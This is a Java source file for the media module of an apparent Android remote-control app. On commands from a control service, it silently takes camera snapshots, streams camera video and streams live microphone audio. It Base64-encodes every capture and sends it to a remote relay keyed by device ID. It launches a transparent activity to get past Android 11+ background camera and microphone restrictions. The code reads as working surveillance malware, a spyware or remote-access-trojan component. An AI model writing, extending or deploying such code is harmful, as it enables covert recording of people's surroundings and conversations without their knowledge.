/*
 * MODULE: MediaEngine.java
 * PURPOSE: Unified media capture subsystem integrating Camera2 background snapshot/MJPEG streaming and AudioRecord microphone live streaming.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> getCameraInfo(), setCamQuality(), takeSnapshot(), startCamStream(), stopCamStream(), startMic(), stopMic(), cleanup()
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> send(JSONObject "camera_info", "camera_photo", "camera_frame", "mic_data", "camera_error", "mic_error"), sendLog(String)
 * - AppController.PermissionActivity -> foreground transition claim for Android 11+ background camera/mic constraints.
 *
 * FUNCTION-BY-FUNCTION FLOW MAPPING:
 * - MediaEngine(Context, String): Captures application context and androidId; initializes CameraManager.
 * - claimForegroundAndExecute(Runnable): Launches transparent activity to satisfy Android 11+ FGS camera/mic requirements before executing media tasks.
 * - getCameraInfo(): Enumerates physical cameras (front/back lens facing) and dispatches JSON array.
 * - setCamQuality(int): Updates JPEG compression quality.
 * - takeSnapshot(JSONObject): Opens requested camera, takes high-res JPEG, encodes to Base64 and dispatches frame.
 * - startCamStream(JSONObject): Opens requested camera and registers repeating preview capture session for live MJPEG streaming.
 * - stopCamStream(): Closes active CameraCaptureSession and CameraDevice.
 * - startMic(JSONObject): Initializes AudioRecord with requested sample rate and streams base64 PCM frames via background thread.
 * - stopMic(): Terminates audio recording thread and releases AudioRecord.
 * - cleanup(): Full teardown of camera background HandlerThread, active camera sessions, and microphone handles.
 */
package com.device.ctrl;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CaptureRequest;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Size;

import org.json.JSONArray;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.Arrays;

public class MediaEngine {

    private final Context ctx;
    private final String androidId;

    // Camera subsystem
    private final CameraManager cm;
    private CameraDevice cd;
    private CameraCaptureSession cs;
    private ImageReader ir;
    private HandlerThread ht;
    private Handler h;
    private boolean isCamStreaming = false;
    private int quality = 50;

    // Mic subsystem
    private AudioRecord ar;
    private boolean isRecording = false;
    private Thread rThread;

    public MediaEngine(Context ctx, String androidId) {
        this.ctx = ctx.getApplicationContext();
        this.androidId = androidId;
        this.cm = (CameraManager) this.ctx.getSystemService(Context.CAMERA_SERVICE);
    }

    private void ensureBackgroundThread() {
        if (ht == null) {
            ht = new HandlerThread("MediaBackground");
            ht.start();
            h = new Handler(ht.getLooper());
        }
    }

    private void claimForegroundAndExecute(Runnable action) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Intent intent = new Intent(ctx, MainActivity.PermissionActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            ctx.startActivity(intent);
            new Handler(Looper.getMainLooper()).postDelayed(action, 200);
        } else {
            action.run();
        }
    }

    // ─── CAMERA CAPABILITIES ───────────────────────────────────────────────────

    public void getCameraInfo() {
        try {
            JSONArray arr = new JSONArray();
            String[] ids = cm.getCameraIdList();
            for (String id : ids) {
                CameraCharacteristics c = cm.getCameraCharacteristics(id);
                Integer face = c.get(CameraCharacteristics.LENS_FACING);
                JSONObject o = new JSONObject();
                o.put("id", id);
                o.put("facing", face == null ? "unknown" : (face == CameraCharacteristics.LENS_FACING_FRONT ? "front" : "back"));
                arr.put(o);
            }
            RelayClient.get().send(new JSONObject().put("type", "camera_info").put("androidId", androidId).put("cameras", arr).put("total", arr.length()));
        } catch (Exception e) {
            sendCameraError("Failed to get camera info: " + e.getMessage());
        }
    }

    public void setCamQuality(int q) {
        if (q > 0 && q <= 100) this.quality = q;
    }

    public void takeSnapshot(JSONObject data) {
        claimForegroundAndExecute(() -> executeSnapshot(data));
    }

    private Size getBestJpegSize(String camId, int targetW, int targetH) {
        try {
            CameraCharacteristics c = cm.getCameraCharacteristics(camId);
            android.hardware.camera2.params.StreamConfigurationMap map = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map != null) {
                Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
                if (sizes != null && sizes.length > 0) {
                    Size best = sizes[0];
                    int bestDiff = Integer.MAX_VALUE;
                    for (Size s : sizes) {
                        int diff = Math.abs(s.getWidth() - targetW) + Math.abs(s.getHeight() - targetH);
                        if (diff < bestDiff) {
                            bestDiff = diff;
                            best = s;
                        }
                    }
                    return best;
                }
            }
        } catch (Exception ignored) {}
        return new Size(targetW, targetH);
    }

    private String resolveCameraId(JSONObject data) {
        if (data == null) return "0";
        if (data.has("cameraId")) return data.optString("cameraId", "0");
        String lens = data.optString("lens", "");
        if (!lens.isEmpty() && cm != null) {
            try {
                int targetFacing = "front".equalsIgnoreCase(lens)
                        ? CameraCharacteristics.LENS_FACING_FRONT
                        : CameraCharacteristics.LENS_FACING_BACK;
                for (String id : cm.getCameraIdList()) {
                    CameraCharacteristics cc = cm.getCameraCharacteristics(id);
                    Integer facing = cc.get(CameraCharacteristics.LENS_FACING);
                    if (facing != null && facing == targetFacing) return id;
                }
            } catch (Exception ignored) {}
        }
        return "0";
    }

    private void executeSnapshot(JSONObject data) {
        if (data == null) return;
        String camId = resolveCameraId(data);
        ensureBackgroundThread();
        try {
            if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                sendCameraError("Camera permission denied");
                return;
            }
            Size sz = getBestJpegSize(camId, 640, 480);
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cd = camera;
                    try {
                        ir = ImageReader.newInstance(sz.getWidth(), sz.getHeight(), ImageFormat.JPEG, 1);
                        ir.setOnImageAvailableListener(reader -> {
                            Image img = null;
                            try {
                                img = reader.acquireLatestImage();
                                if (img != null) {
                                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buf.remaining()];
                                    buf.get(bytes);
                                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                    RelayClient.get().send(new JSONObject()
                                            .put("type", "camera_photo")
                                            .put("androidId", androidId)
                                            .put("image", b64));
                                    RelayClient.get().sendLog("📸 Camera Snapshot Taken!");
                                }
                            } catch (Exception e) {
                                sendCameraError("Snapshot processing failed: " + e.getMessage());
                            } finally {
                                if (img != null) img.close();
                                closeCamera();
                            }
                        }, h);
                        cd.createCaptureSession(Arrays.asList(ir.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder b = cd.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    b.addTarget(ir.getSurface());
                                    b.set(CaptureRequest.JPEG_QUALITY, (byte) quality);
                                    session.capture(b.build(), null, h);
                                } catch (Exception e) {
                                    sendCameraError("Snapshot session failed: " + e.getMessage());
                                    closeCamera();
                                }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {
                                sendCameraError("Snapshot configure failed");
                                closeCamera();
                            }
                        }, h);
                    } catch (Exception e) {
                        sendCameraError("Snapshot setup failed: " + e.getMessage());
                        closeCamera();
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { closeCamera(); }
                @Override public void onError(CameraDevice camera, int error) {
                    sendCameraError("Camera Error code: " + error);
                    closeCamera();
                }
            }, h);
        } catch (Exception e) {
            sendCameraError("Failed to open camera: " + e.getMessage());
        }
    }

    public void startCamStream(JSONObject data) {
        claimForegroundAndExecute(() -> executeStartCamStream(data));
    }

    private void executeStartCamStream(JSONObject data) {
        if (data == null || isCamStreaming) return;
        String camId = resolveCameraId(data);
        isCamStreaming = true;
        ensureBackgroundThread();
        try {
            if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                sendCameraError("Camera permission denied");
                isCamStreaming = false;
                return;
            }
            Size sz = getBestJpegSize(camId, 320, 240);
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cd = camera;
                    try {
                        ir = ImageReader.newInstance(sz.getWidth(), sz.getHeight(), ImageFormat.JPEG, 2);
                        ir.setOnImageAvailableListener(reader -> {
                            if (!isCamStreaming) return;
                            Image img = null;
                            try {
                                img = reader.acquireLatestImage();
                                if (img != null) {
                                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buf.remaining()];
                                    buf.get(bytes);
                                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                    RelayClient.get().send(new JSONObject()
                                            .put("type", "camera_frame")
                                            .put("androidId", androidId)
                                            .put("image", b64));
                                }
                            } catch (Exception ignored) {
                            } finally {
                                if (img != null) img.close();
                            }
                        }, h);
                        cd.createCaptureSession(Arrays.asList(ir.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                cs = session;
                                try {
                                    CaptureRequest.Builder b = cd.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                    b.addTarget(ir.getSurface());
                                    b.set(CaptureRequest.JPEG_QUALITY, (byte) quality);
                                    cs.setRepeatingRequest(b.build(), null, h);
                                } catch (Exception e) {
                                    sendCameraError("Stream request failed: " + e.getMessage());
                                    closeCamera();
                                }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {
                                sendCameraError("Stream configure failed");
                                closeCamera();
                            }
                        }, h);
                    } catch (Exception e) {
                        sendCameraError("Stream setup failed: " + e.getMessage());
                        closeCamera();
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { closeCamera(); }
                @Override public void onError(CameraDevice camera, int error) {
                    sendCameraError("Camera Stream Error code: " + error);
                    closeCamera();
                }
            }, h);
        } catch (Exception e) {
            sendCameraError("Failed to start stream: " + e.getMessage());
            isCamStreaming = false;
        }
    }

    public void stopCamStream() {
        isCamStreaming = false;
        closeCamera();
    }

    private void closeCamera() {
        try { if (cs != null) { cs.close(); cs = null; } } catch (Exception ignored) {}
        try { if (cd != null) { cd.close(); cd = null; } } catch (Exception ignored) {}
        try { if (ir != null) { ir.close(); ir = null; } } catch (Exception ignored) {}
    }

    private void sendCameraError(String msg) {
        try {
            RelayClient.get().send(new JSONObject().put("type", "camera_error").put("androidId", androidId).put("message", msg).put("error", msg));
            RelayClient.get().sendLog("❌ " + msg);
        } catch (Exception ignored) {}
    }

    // ─── MIC CAPABILITIES ──────────────────────────────────────────────────────

    public void startMic(JSONObject data) {
        claimForegroundAndExecute(() -> executeStartMic(data));
    }

    private void executeStartMic(JSONObject data) {
        if (isRecording) return;
        try {
            if (ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                sendMicError("Mic permission denied");
                return;
            }
            int sampleRate = data != null ? data.optInt("sampleRate", data.optInt("rate", 16000)) : 16000;
            int bufSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            if (bufSize == AudioRecord.ERROR || bufSize == AudioRecord.ERROR_BAD_VALUE) bufSize = sampleRate * 2;
            ar = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize);
            if (ar.getState() != AudioRecord.STATE_INITIALIZED) {
                sendMicError("AudioRecord init failed");
                return;
            }
            ar.startRecording();
            isRecording = true;
            RelayClient.get().sendLog("🎙️ Mic Stream Started");
            final int size = bufSize;
            final int finalRate = sampleRate;
            rThread = new Thread(() -> {
                byte[] buf = new byte[size];
                while (isRecording && ar != null) {
                    int read = ar.read(buf, 0, buf.length);
                    if (read > 0) {
                        try {
                            String b64 = Base64.encodeToString(buf, 0, read, Base64.NO_WRAP);
                            RelayClient.get().send(new JSONObject()
                                    .put("type", "mic_data")
                                    .put("androidId", androidId)
                                    .put("rate", finalRate)
                                    .put("size", read)
                                    .put("audio", b64));
                        } catch (Exception ignored) {}
                    }
                }
            });
            rThread.start();
        } catch (Exception e) {
            sendMicError("Failed to start mic: " + e.getMessage());
            isRecording = false;
        }
    }

    public void stopMic() {
        isRecording = false;
        if (rThread != null) {
            try { rThread.interrupt(); rThread.join(500); } catch (Exception ignored) {}
            rThread = null;
        }
        if (ar != null) {
            try { ar.stop(); ar.release(); } catch (Exception ignored) {}
            ar = null;
        }
        RelayClient.get().sendLog("🎙️ Mic Stream Stopped");
    }

    private void sendMicError(String msg) {
        try {
            RelayClient.get().send(new JSONObject().put("type", "mic_error").put("androidId", androidId).put("message", msg).put("error", msg));
            RelayClient.get().sendLog("❌ " + msg);
        } catch (Exception ignored) {}
    }

    public void cleanup() {
        stopCamStream();
        stopMic();
        if (ht != null) {
            ht.quitSafely();
            try { ht.join(); } catch (Exception ignored) {}
            ht = null;
            h = null;
        }
    }
}
